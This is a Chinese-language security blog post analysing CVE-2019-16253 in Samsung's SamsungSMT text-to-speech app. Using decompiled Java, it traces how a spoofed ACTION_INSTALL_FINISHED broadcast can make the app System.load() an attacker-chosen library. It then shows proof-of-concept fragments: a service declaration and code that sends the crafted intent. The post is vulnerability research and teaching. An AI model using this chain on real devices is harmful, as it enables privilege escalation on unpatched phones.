<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<title>CVE-2019-16253 SamsungSMT导出组件提权漏洞 | wnagzihxa1n’s blog</title>
<meta name="generator" content="Jekyll v3.9.0" />
<meta property="og:title" content="CVE-2019-16253 SamsungSMT导出组件提权漏洞" />
<meta name="author" content="wnagzihxa1n" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="这个漏洞是Flanker_hqd发现的，一个逻辑层的漏洞，却可以进行提权，分析完后觉得其实不困难，自己是可以发现的" />
<meta property="og:description" content="这个漏洞是Flanker_hqd发现的，一个逻辑层的漏洞，却可以进行提权，分析完后觉得其实不困难，自己是可以发现的" />
<link rel="canonical" href="http://localhost:4000/2019/12/27/CVE-2019-16253-SamsungSMT%E5%AF%BC%E5%87%BA%E7%BB%84%E4%BB%B6%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E.html" />
<meta property="og:url" content="http://localhost:4000/2019/12/27/CVE-2019-16253-SamsungSMT%E5%AF%BC%E5%87%BA%E7%BB%84%E4%BB%B6%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E.html" />
<meta property="og:site_name" content="wnagzihxa1n’s blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-12-27T20:40:00+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="CVE-2019-16253 SamsungSMT导出组件提权漏洞" />
<script type="application/ld+json">
{"author":{"@type":"Person","name":"wnagzihxa1n"},"headline":"CVE-2019-16253 SamsungSMT导出组件提权漏洞","dateModified":"2019-12-27T20:40:00+08:00","@type":"BlogPosting","description":"这个漏洞是Flanker_hqd发现的，一个逻辑层的漏洞，却可以进行提权，分析完后觉得其实不困难，自己是可以发现的","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2019/12/27/CVE-2019-16253-SamsungSMT%E5%AF%BC%E5%87%BA%E7%BB%84%E4%BB%B6%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E.html"},"datePublished":"2019-12-27T20:40:00+08:00","url":"http://localhost:4000/2019/12/27/CVE-2019-16253-SamsungSMT%E5%AF%BC%E5%87%BA%E7%BB%84%E4%BB%B6%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E.html","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="wnagzihxa1n's blog" /></head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">wnagzihxa1n&#39;s blog<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        <a class="color-cyan-hover" href="https://twitter.com/wnagzihxa1n"><i class="fab fa-twitter-square"></i></a><a class="color-purple-hover" href="https://github.com/wnagzihxa1n"><i class="fab fa-github-square"></i></a>
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
  <div class="author-box">
    
    <!-- 
        <img src="/assets/HeadIcon.jpg" class="author-avatar" alt="Avatar" />
     -->
I am wnagzihxa1n, an unknown iOS/Android security researcher, this blog is my security study notes, just share something interesting.

</div>


<div class="post">
  <h1 class="post-title">CVE-2019-16253 SamsungSMT导出组件提权漏洞</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/android_application_security/">android_application_security</a>
      
  </div>
  
  <div class="post-date">Published on 27 Dec 2019</div>
  
  <p>这个漏洞是Flanker_hqd发现的，一个逻辑层的漏洞，却可以进行提权，分析完后觉得其实不困难，自己是可以发现的</p>

<p>三星有一个叫SamsungSMT这么个应用，具体是干啥的我不是很清楚</p>

<p>它有一个导出组件<code class="language-plaintext highlighter-rouge">com.samsung.SMT.SamsungTTSService</code>，其<code class="language-plaintext highlighter-rouge">onCreate</code>方法里动态注册了一个BroadcastReceiver，我们知道这默认是导出的</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public void onCreate() {
    ...
    LangPackMgr.get().a(this.getApplicationContext());  // 入口
    ...
    super.onCreate();
}

public void a(Context context) {
    if(this.context == null) {
        ...
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction("com.samsung.SMT.ACTION_INSTALL_FINISHED");
        this.context.registerReceiver(this.LangPackMgr$2, intentFilter);  // 注册一个广播接收器："com.samsung.SMT.ACTION_INSTALL_FINISHED"
        ...
    }
}
</code></pre></div></div>

<p>注册的<code class="language-plaintext highlighter-rouge">LangPackMgr$2</code>会将传入的Intent内两个数据作为参数构造一个<code class="language-plaintext highlighter-rouge">LangPackMgr$UpdateEngineInfo</code>对象，然后加到一个队列里，经过一系列判断，开始更新</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BroadcastReceiver LangPackMgr$2;

public LangPackMgr() {
    ...
    this.LangPackMgr$2 = new LangPackMgr$2(this);
}

public void onReceive(Context context, Intent intent) {
    int v7 = -1;
    if(intent.getAction().equals("com.samsung.SMT.ACTION_INSTALL_FINISHED")) {
        ArrayList arrayList = intent.getCharSequenceArrayListExtra("BROADCAST_CURRENT_LANGUAGE_INFO");
        Class_l v1 = new Class_l(arrayList.toArray(new String[arrayList.size()]));
        v1.a(intent.getStringExtra("BROADCAST_CURRENT_LANGUAGE_VERSION"));
        v1.setArrayList(intent.getCharSequenceArrayListExtra("BROADCAST_DB_FILELIST"));
        v1.a(true);
        int Extra_SMT_ENGINE_VERSION = intent.getIntExtra("SMT_ENGINE_VERSION", v7);
        String Extra_SMT_ENGINE_PATH = intent.getStringExtra("SMT_ENGINE_PATH");
        if(Extra_SMT_ENGINE_VERSION &gt; SmtTTS.get().getEngineVersion() &amp;&amp; (r.isFileExist(Extra_SMT_ENGINE_PATH))) {
            if(j.a(Extra_SMT_ENGINE_PATH)) {
                LangPackMgr.getUpdateEngineQueue(this.a).add(new LangPackMgr$UpdateEngineInfo(Extra_SMT_ENGINE_VERSION, Extra_SMT_ENGINE_PATH));
                LOG.b(q.b, "LangPackMgr - Add candidate engine [%d][%s]", new Object[]{Integer.valueOf(Extra_SMT_ENGINE_VERSION), Extra_SMT_ENGINE_PATH});
            }
        ...
        LangPackMgr.doUpdateEngine(this.a);
    }
}
</code></pre></div></div>

<p>使用多线程来执行，在线程里我们看到一个<code class="language-plaintext highlighter-rouge">reloadEngine()</code>方法</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>static void doUpdateEngine(LangPackMgr langPackMgr) {
    langPackMgr.updateEngine();
}

private void updateEngine() {
    if(this.mThreadUpdateEngine == null || !this.mThreadUpdateEngine.isAlive()) {
        this.mThreadUpdateEngine = new LangPackMgr$EngineUpdateThread(this, null);
        this.mThreadUpdateEngine.start();
    }
}

public void run() {
    ...
        if(v1 != null &amp;&amp; ((LangPackMgr$UpdateEngineInfo)v1).SMT_ENGINE_VERSION &gt; SmtTTS.get().getEngineVersion()) {
            l.a().b(((LangPackMgr$UpdateEngineInfo)v1).SMT_ENGINE_PATH);
            if(SmtTTS.get().reloadEngine()) {   &lt;== 注意看这里
                LOG.c("Restart engine...");
</code></pre></div></div>

<p>跟入可以看到直接使用<code class="language-plaintext highlighter-rouge">System.load()</code>加载了<code class="language-plaintext highlighter-rouge">v0_2</code>指向的路径，那么<code class="language-plaintext highlighter-rouge">l.a().k()</code>返回的是什么呢？</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public boolean reloadEngine() {
    boolean v0_3;
    boolean v3;
    this.e();
    try {
        String v0_2 = l.a().k();
        if(r.isFileExist(v0_2)) {
            System.load(v0_2);
        }
        else {
            goto label_71;
        }
    }
</code></pre></div></div>

<p>我们看<code class="language-plaintext highlighter-rouge">reloadEngine()</code>上两句代码，这里说的是如果版本号高于本地数据，就进入<code class="language-plaintext highlighter-rouge">if</code>逻辑处理，可以看到，最后将Intent内<code class="language-plaintext highlighter-rouge">"SMT_ENGINE_PATH"</code>的数据写到本地SP文件的<code class="language-plaintext highlighter-rouge">"SMT_INSTALLED_ENGINE_PATH"</code>字段</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if(v1 != null &amp;&amp; ((LangPackMgr$UpdateEngineInfo)v1).SMT_ENGINE_VERSION &gt; SmtTTS.get().getEngineVersion()) {
    l.a().b(((LangPackMgr$UpdateEngineInfo)v1).SMT_ENGINE_PATH);    &lt;== 1
    
public void b(String param_SMT_ENGINE_PATH) {
    if(param_SMT_ENGINE_PATH != null) {
        l.SMT_LATEST_INSTALLED_ENGINE_PATH = param_SMT_ENGINE_PATH;
        this.a("SMT_LATEST_INSTALLED_ENGINE_PATH", param_SMT_ENGINE_PATH);  &lt;== 2
    }
    else {
        LOG.d("Try to set SMT_INSTALLED_ENGINE_PATH with null");
    }
}

public void a(String SMT_INSTALLED_ENGINE_PATH, String param_SMT_ENGINE_PATH) {
    this.a(n.a, SMT_INSTALLED_ENGINE_PATH, param_SMT_ENGINE_PATH);  &lt;== 3
}

public void a(n arg2, String SMT_INSTALLED_ENGINE_PATH, String param_SMT_ENGINE_PATH) {
    SharedPreferences sp = this.c(arg2);
    if(sp != null) {
        SharedPreferences$Editor sp$editor = sp.edit();
        sp$editor.putString(SMT_INSTALLED_ENGINE_PATH, param_SMT_ENGINE_PATH);  &lt;== 4
        sp$editor.commit();
    }
}
</code></pre></div></div>

<p>再来看<code class="language-plaintext highlighter-rouge">l.a().k()</code>，可以看到返回值就是<code class="language-plaintext highlighter-rouge">"SMT_ENGINE_PATH"</code>指向的数据，这个数据我们可控，修改Intent即可</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public String k() {
    if(r.isFileExist(l.SMT_LATEST_INSTALLED_ENGINE_PATH)) {
        try {
            if(j.a(l.SMT_LATEST_INSTALLED_ENGINE_PATH)) {
                String v0_1 = l.SMT_LATEST_INSTALLED_ENGINE_PATH;
                return v0_1;
            }

            LOG.a("Invalid INSTALLED_ENGINE_PATH = " + l.SMT_LATEST_INSTALLED_ENGINE_PATH);
        }
        catch(Exception v0) {
            v0.printStackTrace();
        }
    }

    this.j();
    return null;
}
</code></pre></div></div>

<p>这时我们来看<code class="language-plaintext highlighter-rouge">com.samsung.SMT.SamsungTTSService</code>注册的另一个BroadcastReceiver</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public void onCreate() {
    ...
    LangPackMgr.get().a(this.getApplicationContext());  // 入口
    ...
    super.onCreate();
}

public void a(Context arg4) {
    if(this.context == null) {
        ...
        IntentFilter v0_1 = new IntentFilter("android.intent.action.PACKAGE_ADDED");
        v0_1.addAction("android.intent.action.PACKAGE_REMOVED");
        v0_1.addAction("android.intent.action.PACKAGE_CHANGED");
        v0_1.addDataScheme("package");
        this.context.registerReceiver(this.LangPackMgr$1, v0_1);  // 注册一个广播接收器，用于判断应用安装，删除相关Action
    }
}
</code></pre></div></div>

<p>广播接收器<code class="language-plaintext highlighter-rouge">LangPackMgr$1</code>会判断新安装应用的包名是否是<code class="language-plaintext highlighter-rouge">"com.samsung.SMT.lang"</code>开头，如果是，就调用函数<code class="language-plaintext highlighter-rouge">a.d()</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BroadcastReceiver LangPackMgr$1;
    

public LangPackMgr() {
    this.LangPackMgr$1 = new LangPackMgr.1(this);
}

class LangPackMgr.1 extends BroadcastReceiver {
    LangPackMgr.1(LangPackMgr arg1) {
        this.a = arg1;
        super();
    }

    @Override  // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        String v1 = intent.getData().getSchemeSpecificPart();
        if(((action.equals("android.intent.action.PACKAGE_ADDED")) 
                    || (action.equals("android.intent.action.PACKAGE_CHANGED")) 
                    || (action.equals("android.intent.action.PACKAGE_REMOVED"))) 
                &amp;&amp; v1 != null 
                &amp;&amp; (v1.startsWith("com.samsung.SMT.lang"))) {
            this.a.d();
        }
    }
}
</code></pre></div></div>

<p>经过若干次的调用</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public void d() {
    this.a(null);
}

public void a(j arg2) {
    if(this.context != null) {
        if(arg2 != null) {
            this.i = arg2;
        }

        this.e();  // 传入的参数是null，所以直接调用函数e
    }
}
</code></pre></div></div>

<p>启动一个线程</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>private void e() {
    if(this.g == null || !this.g.isAlive()) {
        this.g = new i(this, null);
        this.g.start();
    }
}
</code></pre></div></div>

<p>对应的实现，通过搜索安装的应用来过滤出指定前缀的包名，然后启动Service</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class Thread_i extends Thread {
    private Thread_i(LangPackMgr langPackMgr) {
        this.a = langPackMgr;
        super();
    }

    @Override
    public void run() {
        PackageInfo packageInfo;  // 获取当前应用对象package信息
        HashMap v3 = new HashMap();
        HashMap v4 = new HashMap();
        try {  // 获取所有安装的应用
            Iterator iterator = LangPackMgr.getContext(this.a).getPackageManager().getInstalledPackages(0x2000).iterator();  // 获取所有安装的应用
            while(true) {
            label_12:
                if(!iterator.hasNext()) {
                    goto label_56;
                }

                Object v0_1 = iterator.next();
                packageInfo = (PackageInfo)v0_1;  // 获取当前应用对象package信息
                if((packageInfo.applicationInfo.flags &amp; 1) == 1 || !packageInfo.packageName.startsWith("com.samsung.SMT.lang")) {
                    continue;
                }

                break;
            }
        }
        catch(Exception v0) {
            v0.printStackTrace();
        }

        try {  // 包名为：com.samsung.SMT.lang.xxx
            Intent intent = new Intent(packageInfo.packageName);  // 包名为：com.samsung.SMT.lang.xxx
            intent.setPackage(packageInfo.packageName);
            LangPackMgr.getContext(this.a).startService(intent);
            LangPackMgr.increaseTriggerCount(this.a);
            v3.put(packageInfo.packageName.replace("com.samsung.SMT.lang", "smt"), packageInfo.packageName);
            goto label_12;
        }
        catch(Exception v1) {
        }

        ...

        v0.printStackTrace();
    }
}
</code></pre></div></div>

<p>关键代码，意味着我们的Poc需要有一个Service，以包名作为<code class="language-plaintext highlighter-rouge">intent-filter</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Intent intent = new Intent(packageInfo.packageName);  // 包名为：com.samsung.SMT.lang.xxx
intent.setPackage(packageInfo.packageName);
LangPackMgr.context.startService(intent);
</code></pre></div></div>

<p>接下来结合flanker_hqd的Exp来解析</p>
<ul>
  <li>https://github.com/flankerhqd/vendor-android-cves</li>
</ul>

<p>我们可以看到上面在监控到有以<code class="language-plaintext highlighter-rouge">"com.samsung.SMT.lang"</code>为包名前缀的应用安装时，会启动安装应用一个Service，指定Action为包名，所以我们需要注册一个Service，Service的Action为包名</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;service
    android:name=".MyService"
    android:enabled="true"
    android:exported="true"&gt;
    &lt;intent-filter&gt;
        &lt;action android:name="com.samsung.SMT.lang.poc" /&gt;
    &lt;/intent-filter&gt;
&lt;/service&gt;
</code></pre></div></div>

<p>在我们的Service里，可以执行发送Intent的操作，这个Intent就会被广播接收器<code class="language-plaintext highlighter-rouge">LangPackMgr$2</code>接收到，进而调用<code class="language-plaintext highlighter-rouge">System.load()</code>，最后完成提权操作</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Thread thread = new Thread(new Runnable() {
    @Override
    public void run() {
        ...
        Intent bi = new Intent();
        bi.setAction("com.samsung.SMT.ACTION_INSTALL_FINISHED");
        ArrayList&lt;CharSequence&gt; s = new ArrayList&lt;&gt;();
        bi.putCharSequenceArrayListExtra("BROADCAST_CURRENT_LANGUAGE_INFO", s);
        bi.putExtra("BROADCAST_CURRENT_LANGUAGE_VERSION", "99999");
        bi.putCharSequenceArrayListExtra("BROADCAST_DB_FILELIST", s);
        bi.putExtra("SMT_ENGINE_VERSION", 0x2590cd5b);//installed version is 361811291
        bi.putExtra("SMT_ENGINE_PATH", input);
        sendBroadcast(bi);
    }
});
thread.start();
</code></pre></div></div>

<h2 id="references">References</h2>
<ul>
  <li><a href="https://paper.seebug.org/1070/">只是想学习外语，却被拿了system shell？</a></li>
  <li><a href="https://blog.flanker017.me/text-to-speech-speaks-pwned/">Text-To-Speech speaks pwned</a></li>
</ul>

</div>


<div class="comments">
<div id="disqus_thread"></div>
<script>
 var disqus_config = function () {
     this.page.url = 'http://localhost:4000/2019/12/27/CVE-2019-16253-SamsungSMT%E5%AF%BC%E5%87%BA%E7%BB%84%E4%BB%B6%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E.html';
     this.page.identifier = '/2019/12/27/CVE-2019-16253 SamsungSMT导出组件提权漏洞';
     this.page.title = 'CVE-2019-16253 SamsungSMT导出组件提权漏洞';
 };

 (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
     var d = document, s = d.createElement('script');

     s.src = '//wnagzihxa1n-github-io.disqus.com/embed.js';

     s.setAttribute('data-timestamp', +new Date());
     (d.head || d.body).appendChild(s);
 })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>

</div>




<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/2021/01/22/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2021.01.22.html">
            大土豆安全笔记 2021.01.22 在线求团购*OS Internals III
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2021/01/15/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2021.01.15.html">
            大土豆安全笔记 2021.01.15 您已本分
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2021/01/08/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2021.01.08.html">
            大土豆安全笔记 2021.01.08 我，零基础，学iOS macOS安全
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>all tags</h2>
  <div class="tag-cloud"><a href="/tag/android_application_security/" class="set-1">android_application_security</a> <a href="/tag/android_ctf/" class="set-3">android_ctf</a> <a href="/tag/browser_security/" class="set-4">browser_security</a> <a href="/tag/security_daily/" class="set-5">security_daily</a></div>
  




<script>
  let i = 0;
  const text = '';
  const speed = parseInt('50');
  
  function typeWriter() {
    if (i < text.length) {
      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
      i++;
      setTimeout(typeWriter, speed);
    }
  }

  document.getElementById('animated-post-description').style.display = 'initial';
  typeWriter();
</script>

      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
